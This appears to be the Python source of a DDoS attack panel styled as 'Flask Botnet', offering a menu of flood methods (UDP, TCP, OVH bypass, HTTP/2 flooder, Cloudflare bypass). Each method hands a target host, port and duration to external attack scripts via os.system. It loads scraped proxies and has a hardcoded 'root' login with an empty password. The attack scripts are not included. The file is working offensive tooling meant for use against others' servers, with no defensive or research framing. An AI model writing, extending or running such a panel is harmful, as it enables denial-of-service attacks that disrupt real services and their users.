import socket
import os
import requests
import random
from pystyle import Colors, Colorate, Center
import getpass
import time
from time import sleep
import sys

print("Wait Scraping Proxy")
os.system("node scrape");
print("Scraping Proxy Succes")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    print(Colorate.Diagonal(Colors.yellow_to_red, "Welcome To Dragon DDoS Panel | User: root | Plan: VVIP | Proxy: " + bots_str + " | Happy To Use"))
    print("")
###COPYRIGHT tool###
def si():
    print('')

###help###
def help():
    print("""\x1b[1;31m* \x1b[1;37mmethods\x1b[1;31m: \x1b[1;37mList methods attack for ghost
\x1b[1;31m* \x1b[1;37mclear  \x1b[1;31m: \x1b[1;37mBack to main on home""")
####Methods####
def meth():
    si()
    print(f"""\x1b[1;31m \x1b[1;37m.tcp          Comprehensive tcp attack causes luT
\x1b[1;31m \x1b[1;37m.udp          Comprehensive udp attack causes luT
\x1b[1;31m \x1b[1;37m.ovh          Ovh Strong Bypass TCP & UDP
\x1b[1;31m \x1b[1;37m.https        reset rapid high RQS
\x1b[1;31m \x1b[1;37m.flooder      flooder using http/2 whit high RQS
\x1b[1;31m \x1b[1;37m.bypass       bypass for cloudflare & uam
\x1b[1;31m \x1b[1;37m.killer       killer to target
\x1b[1;31m \x1b[1;37m.cf-normal    cf pro whit high RQS

\x1b[1;31m \x1b[1;37m.stop         Stop all attacks
""")

def menu():
    sys.stdout.write(f"\x1b]2;Flask Botnet | Zombies : 370\x07")
    os.system('cls' if os.name == 'nt' else 'clear')
    si()
    print(f"""
\x1b[1;37mHello . Welcome To \x1b[1;31mFlask Botnet
\x1b[1;37mType \x1b[1;31m|\x1b[1;37mhelp\x1b[1;31m|\x1b[1;37m For commands
""")
def main():
    menu()
    while(True):
        cnc = input(f"""\x1b[1;31mroot • Flask ~# \x1b[1;37m""")
        if cnc == "METHODS" or cnc == "methods" or cnc == "Methods":
            meth()
        elif cnc == "CLEAR" or cnc == "clear" or cnc == "cls":
            main()
        elif cnc == "HELP" or cnc == "Help" or cnc == "help":
            help()
        
        #####L4####
        elif "udp" in cnc:
            try:
                host=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                print(f"""\x1b[1;37m<\x1b[1;31m!\x1b[1;37m> \x1b[1;37mFlask Botnet \x1b[1;31m|> \x1b[1;37mAttack Sent !!!""")
                os.system(f"go run udp.go {host} {port} {time} payload=random size=1024")
            except IndexError:
                print("Usage : udp <ip> <port> <time>")
                print("Example : udp 1.1.1.1 80 60")
        elif "tcp" in cnc:
            try:
                host=cnc.split()[1]
                port=cnc.split()[2]
                time=cnc.split()[3]
                print(f"""\x1b[1;37m<\x1b[1;31m!\x1b[1;37m> \x1b[1;37mFlask Botnet \x1b[1;31m|> \x1b[1;37mAttack Sent !!!""")
                os.system(f"node r2.js {host} {port} 99 {time}")
            except IndexError:
                print("Usage : tcp <ip> <port> <time>")
                print("Example : tcp 1.1.1.1 80 60")
        elif "ovh" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                print(f"""\x1b[1;37m<\x1b[1;31m!\x1b[1;37m> \x1b[1;37mFlask Botnet \x1b[1;31m|> \x1b[1;37mAttack Sent !!!""")
                os.system(f"./OVH {host} 15 90 {time}")
            except IndexError:
                print("Usage : ovh <ip> <time>")
                print("Example : ovh 1.1.1.1 60")
        elif "https" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                print(f"""\x1b[1;37m<\x1b[1;31m!\x1b[1;37m> \x1b[1;37mFlask Botnet \x1b[1;31m|> \x1b[1;37mAttack Sent !!!""")
                os.system(f"node https.js {host} {time} 90 10 proxy.txt")
            except IndexError:
                print("Usage : https <host> <time>")
                print("Example : https https://example.com 60")
        elif "bypass" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                print(f"""\x1b[1;37m<\x1b[1;31m!\x1b[1;37m> \x1b[1;37mFlask Botnet \x1b[1;31m|> \x1b[1;37mAttack Sent !!!""")
                os.system(f"node bypass.js GET {host} {time} 10 90 proxy.txt")
            except IndexError:
                print("Usage : bypass <host> <time>")
                print("Example : bypass https://example.com 60")
        elif "flooder" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                print(f"""\x1b[1;37m<\x1b[1;31m!\x1b[1;37m> \x1b[1;37mFlask Botnet \x1b[1;31m|> \x1b[1;37mAttack Sent !!!""")
                os.system(f"node flooder.js {host} {time} 64 7")
            except IndexError:
                print("Usage : bypass <host> <time>")
                print("Example : bypass https://example.com 60")
        elif "killer" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                print(f"""\x1b[1;37m<\x1b[1;31m!\x1b[1;37m> \x1b[1;37mFlask Botnet \x1b[1;31m|> \x1b[1;37mAttack Sent !!!""")
                os.system(f"node killer.js {host} {time} 90 10 proxy.txt")
            except IndexError:
                print("Usage : bypass <host> <time>")
                print("Example : bypass https://example.com 60")
        elif "cf-normal" in cnc:
            try:
                host=cnc.split()[1]
                time=cnc.split()[2]
                print(f"""\x1b[1;37m<\x1b[1;31m!\x1b[1;37m> \x1b[1;37mFlask Botnet \x1b[1;31m|> \x1b[1;37mAttack Sent !!!""")
                os.system(f"node cf.js {host} {time} 90 10 proxy.txt")
            except IndexError:
                print("Usage : bypass <host> <time>")
                print("Example : bypass https://example.com 60")
        elif "stop" in cnc:
            try:
                print(f"""\x1b[1;31mStop all attack !!!""")
                os.system(f"pkill screen")
            except IndexError:
                print("")
                print("")
        else:
            try:
                cmd=cnc.split()[0]
                print("Command : [ "+cmd+" ] Not Found!!")
            except IndexError:
                pass
            
def login():
    user = "root"
    passwd = ""
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Thank you")
        time.sleep(1)
        
        main()

login()